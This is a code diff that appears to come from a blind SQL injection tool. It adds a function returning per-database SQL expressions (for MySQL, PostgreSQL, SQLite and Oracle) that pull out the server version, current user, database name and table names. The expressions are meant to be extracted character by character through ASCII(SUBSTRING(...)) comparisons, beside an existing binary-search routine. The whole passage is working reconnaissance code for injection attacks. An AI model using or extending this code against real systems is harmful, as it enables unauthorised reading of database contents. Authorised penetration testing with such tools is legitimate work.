@@ -217,3 +217,57 @@ def _binary_search_char(
     if ordinal < _ASCII_MIN or ordinal > _ASCII_MAX:
         return ordinal  # caller handles out-of-range (end of string / NULL)
     return ordinal
+
+
+# ---------------------------------------------------------------------------
+# Per-DBMS extraction targets
+# ---------------------------------------------------------------------------
+
+def get_extraction_targets(dbms: str) -> List[tuple[str, str]]:
+    """
+    Return a list of (label, sql_expr) pairs to extract for the given DBMS.
+
+    These are ordered from cheapest/most useful to most expensive.
+    Each expression must be a scalar SQL expression that returns a single
+    string value (suitable for wrapping in ASCII(SUBSTRING(...))).
+    """
+    dbms = (dbms or "").lower()
+
+    if dbms == "mysql" or dbms == "mariadb":
+        return [
+            ("version",          "VERSION()"),
+            ("current_user",     "CURRENT_USER()"),
+            ("current_database", "DATABASE()"),
+            ("tables",
+             "(SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR ',') "
+             "FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1)"),
+        ]
+    elif dbms == "postgresql":
+        return [
+            ("version",          "VERSION()"),
+            ("current_user",     "CURRENT_USER"),
+            ("current_database", "CURRENT_DATABASE()"),
+            ("tables",
+             "(SELECT STRING_AGG(table_name,',' ORDER BY table_name) "
+             "FROM information_schema.tables WHERE table_schema='public')"),
+        ]
+    elif dbms == "sqlite":
+        return [
+            ("version",          "sqlite_version()"),
+            ("tables",
+             "(SELECT GROUP_CONCAT(name,',') FROM sqlite_master WHERE type='table')"),
+        ]
+    elif dbms == "oracle":
+        return [
+            ("version",       "(SELECT banner FROM v$version WHERE rownum=1)"),
+            ("current_user",  "(SELECT USER FROM DUAL)"),
+            ("tables",
+             "(SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) "
+             "FROM user_tables)"),
+        ]
+    else:
+        # Generic fallback — VERSION() works on MySQL, PG, MariaDB
+        return [
+            ("version",      "VERSION()"),
+            ("current_user", "CURRENT_USER()"),
+        ]
